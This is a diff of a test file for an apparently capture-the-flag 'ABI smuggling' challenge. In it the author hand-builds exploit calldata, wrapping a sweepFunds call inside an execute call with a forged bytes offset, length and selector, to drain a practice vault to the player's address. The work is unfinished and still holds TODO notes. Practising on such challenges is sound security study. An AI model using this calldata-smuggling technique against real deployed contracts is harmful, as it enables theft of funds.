@@ -74,20 +74,29 @@ describe('[Challenge] ABI smuggling', function () {
             const ABIData = IFace.encodeFunctionData(methodName, arguments);
             return ABIData;
         }
-// token recipient amount
-        const fnData = ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 
-                     + ethers.utils.hexZeroPad(player.address, 32).slice(2)
-                     + ethers.utils.hexZeroPad(VAULT_TOKEN_BALANCE, 32).slice(2);
 
-        console.log(fnData);
-        console.log(ethers.utils.hexZeroPad(attackToken.address));
+        const vaultInt = ["function sweepFunds(address receiver, address token)"]
+        const vaultABI = createInterface(vaultInt, "sweepFunds", [player.address, attackToken.address])
+
+        console.log("sweep ABI");
+        console.log(vaultABI);
+
+        const res = attackVault.interface.encodeFunctionData("execute", [attackVault.address, vaultABI]);
+        console.log("final");
+        console.log(res);
+// token recipient amount
+        const fnData = ethers.utils.hexZeroPad(player.address, 32).slice(2)
+                     + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 
+
+        // console.log(fnData);
+        // console.log(ethers.utils.hexZeroPad(attackToken.address));
 
         const executeFs = vault.interface.getSighash("execute")
         const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
         const bytesLocation = ethers.utils.hexZeroPad("0x68", 32).slice(2); // address of actual data
         // TODO: fill in when actual data bytes is known
-        const bytesLength = ethers.utils.hexZeroPad("0x03", 32).slice(2)
-        const fnSelectorFake = "" //"0xd9caed12".slice(2);
+        const bytesLength = ethers.utils.hexZeroPad("0x02", 32).slice(2)
+        const fnSelectorFake = "" // "0xd9caed12".slice(2);
         const fnSelectorReal = "0x85fb709d".slice(2);
         // TODO: put data
         const payload = executeFs + target + bytesLocation + bytesLength + fnSelectorFake + fnSelectorReal + fnData;
